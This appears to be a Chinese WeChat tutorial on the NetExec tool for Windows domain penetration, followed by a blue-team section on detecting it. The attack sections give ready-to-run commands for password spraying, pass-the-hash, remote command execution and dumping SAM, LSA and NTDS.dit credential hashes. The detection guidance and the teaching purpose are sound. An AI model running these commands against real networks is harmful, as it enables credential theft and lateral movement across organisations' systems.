---
title: 【微信】NetExec：内网渗透的瑞士军刀深度实战
source: https://mp.weixin.qq.com/s/BRlZ-7cWpEoF1p-B-wOqlg
source_host: mp.weixin.qq.com
clip_date: 2026-11-10T10:55:30+08:00
trace_id: e633c6bc-3d31-4889-b0bd-dbe65aeeb9cf
content_hash: d60c621b89d700eee26fccc912caddf95725a4fc9e32598e88d56469bd4519db
status: synced
tags:
  - 微信
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: null
ai_summary_style: null
images_status:
  total: 1
  succeeded: 1
  failed_urls: []
notion_page_id: 41475244-d011-8175-998b-ebadc9d28ee6
ioc:
  cves: []
  cwes: []
  hashes:
    - 31d6cfe0d16ae931b73c59d7e0c089c0
    - aad3b435b51404eeaad3b435b51404ee
  domains: []
  tools: []
  techniques: []
---

**运维安全入门** *2026年11月10日 08:30*

## NetExec：内网渗透的瑞士军刀深度实战

在内网渗透与域环境攻防中，有一款工具几乎是所有红队选手的“肌肉记忆”。它曾是赫赫有名的 **CrackMapExec (CME)**，如今经过社区重构与性能升级，正式更名为 **NetExec (NXC)**。

如果说 Nmap 是外网探测的王者，那么 NetExec 就是 **内网域环境枚举与横向移动的“瑞士军刀”**。

今天，我们就来深度拆解这款工具的核心机制、高阶实战玩法，以及运维团队该如何在海量日志中精准揪出它的扫描痕迹。

## 01为什么 NetExec 无可替代？

NetExec 并不是一个简单的“爆破脚本”，它的强大在于 **基于 Impacket 库的模块化协议支持**。

-   **多协议原生支持**
    
    ：无需切换工具，即可在 SMB、WMI、LDAP (Active Directory)、MSSQL、WINRM 等协议间无缝游走。
    
-   **内存级执行**
    
    ：在执行远程命令或导出 Hash 时，大量操作直接在内存中完成（如调用 `secretsdump` ），不落地文件，极大降低了被传统 EDR 静态查杀的概率。
    
-   **自动化工作流**
    
    ：发现一台存活主机 → 自动枚举用户 → 自动尝试密码喷洒 → 自动测试哈希传递（PtH） → 自动抓取内存中的敏感信息。
    

## 02安装与环境避坑（告别依赖地狱）

老版本的 CME 经常因为 Python 依赖冲突导致安装失败（俗称“依赖地狱”）。NetExec 官方目前最推荐的安装方式是使用 **Poetry** 或 **Docker**。

### 1\. 使用 Docker 运行（最省心）

```bash
docker pull opensecurity/netexec docker run -it --rm --name nxc opensecurity/netexec smb 192.168.1.100
```

### 2\. 使用 Poetry 源码安装（推荐 Kali/Ubuntu）

```
# 安装 Poetry 依赖管理器 pipx install poetry  # 克隆 NetExec 源码 git clone https://github.com/Pennyw0rth/NetExec cd NetExec  # 安装项目依赖并进入虚拟环境 poetry install poetry shell  # 验证安装 nxc smb 127.0.0.1
```

## 03核心实战：从信息收集到权限获取

NetExec 的命令逻辑极其统一：nxc <协议> <目标> -u <用户> -p <密码/Hash>。

### 1\. 资产存活与用户枚举 (SMB & LDAP)

在拿到初始 foothold 后，第一步是摸清域内的主机和用户资产。

```
# 扫描 C 段，探测开启了 SMB 签名的主机 nxc smb 192.168.1.0/24 --gen-relay-list targets.txt  # 通过 LDAP 协议枚举域内所有用户名 (无需认证或低权限即可) nxc ldap 192.168.1.10 -u '' -p '' --users
```

### 2\. 密码喷洒与哈希传递 (PtH)

这是 NetExec 最核心的杀手锏。在内网中，我们往往拿不到明文密码，但能抓到 NTLM Hash。

```
# 密码喷洒：使用字典对域控进行低频次喷洒 nxc smb 192.168.1.10 -u users.txt -p passwords.txt --no-bruteforce  # 哈希传递 (Pass-The-Hash)：使用 NTLM Hash 直接获取 System 权限 nxc smb 192.168.1.10 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0' --local-auth  # 票据传递 (Pass-The-Ticket) 配合 Rubeus (需导出 ccache 票据) nxc smb 192.168.1.10 -u Administrator --use-kcache
```

### 3\. 远程命令执行与数据抓取

一旦通过 PtH 或明文密码获得了权限，NetExec 可以一键执行后渗透操作。

```
# 通过 SMBExec 模块在目标机器执行命令 (不落地 exe) nxc smb 192.168.1.10 -u Admin -p 'Password123' -x 'whoami /all'  # 一键抓取目标主机的 SAM 数据库与 LSA 缓存 Hash nxc smb 192.168.1.10 -u Admin -p 'Password123' --sam  # 抓取域控上的 NTDS.dit (域控所有用户的 Hash 库) nxc ldap 192.168.1.10 -u Admin -p 'Password123' --ntds
```

## 04蓝队视角：如何检测 NetExec 的入侵痕迹？

NetExec 虽然强大，但其底层的 SMB/RPC 调用在严谨的防御体系面前依然会留下明显的“脚印”。运维与蓝队团队应从以下三个维度进行监测：

### 1\. 流量层检测 (NTA/IDS)

-   **异常 SMB 连接**
    
    ：单一内网 IP 在短时间内向大量主机的 445 端口发起高频连接请求，且伴随 `SMB2 NEGOTIATE` 后的频繁 `LOGOFF` 。
    
-   **SMB 签名缺失**
    
    ：NetExec 默认会优先尝试未签名 SMB 连接，若内网强制开启了 SMB 签名，其扫描速度会显著下降，且流量特征更易被捕获。
    

### 2\. 主机层日志 (Windows Event Logs)

-   **事件 ID 4624 (登录成功)**
    
    ：重点关注 **Logon Type 3 (网络登录)** 和 **Logon Type 9 (新凭据)**。若发现大量来自同一 IP 的 Type 3 登录，且伴随不同的用户名，大概率为密码喷洒。
    
-   **事件 ID 4688 (进程创建)**
    
    ：若发现 `WmiPrvSE.exe` 或 `svchost.exe` 频繁拉起 `cmd.exe` / `powershell.exe` ，极可能是 NetExec 在通过 WMI 或 SMBExec 执行远程命令。
    

### 3\. 域控层审计 (LDAP)

-   **异常 LDAP 查询**
    
    ：监测对 `LDAP_SEARCH` 请求的审计。如果某个非特权账号在短时间内发起了大量针对 `objectClass=user` 或 `objectClass=computer` 的枚举请求，应触发高危告警。
    

## 05总结

NetExec (NXC) 将内网渗透中繁琐的协议交互、Hash 传递、资产枚举封装成了几行优雅的命令。对于红队而言，它是突破内网防线的利器；对于蓝队与运维安全人员而言，深刻理解它的攻击原理与流量特征，才是构建企业内网“零信任”与“纵深防御”体系的基石。
